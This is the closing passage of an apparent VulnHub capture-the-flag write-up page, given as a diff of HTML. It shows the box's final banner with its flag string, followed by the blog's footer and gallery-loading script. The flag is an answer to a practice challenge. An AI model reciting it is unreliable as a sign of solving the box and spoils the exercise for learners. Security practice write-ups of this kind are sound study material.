+</span></span><span class=line><span class=cl><span class=c1>#             Hope you enjoyed this.               #</span>
+</span></span><span class=line><span class=cl><span class=c1>#                                                  #</span>
+</span></span><span class=line><span class=cl><span class=c1>#  flag{7fe64512ecd4dba377b50627f307d1678b14132f}  #</span>
+</span></span><span class=line><span class=cl><span class=c1>#                                                  #</span>
+</span></span><span class=line><span class=cl><span class=c1>#         Please tweet on @arif_xpress             #</span>
+</span></span><span class=line><span class=cl><span class=c1>#                                                  #</span>
+</span></span><span class=line><span class=cl><span class=c1>####################################################</span>
+</span></span></code></pre></td></tr></table></div></div></section><footer class="article-meta article-footer"><section class=article-tags><a href=/tags/vulnhub/>Vulnhub</a></section><section class="article-copyright inline-meta"><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2026 Ke1thLi 的技术笔记</section><section class=powerby><br></section></footer><script type=module>
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script></main></div><script type=text/javascript src=/ts/main.acaf849f2b273f6a8368a58b001f336738d0c948d92e79b116467d0c7515f932.js defer></script></body></html>
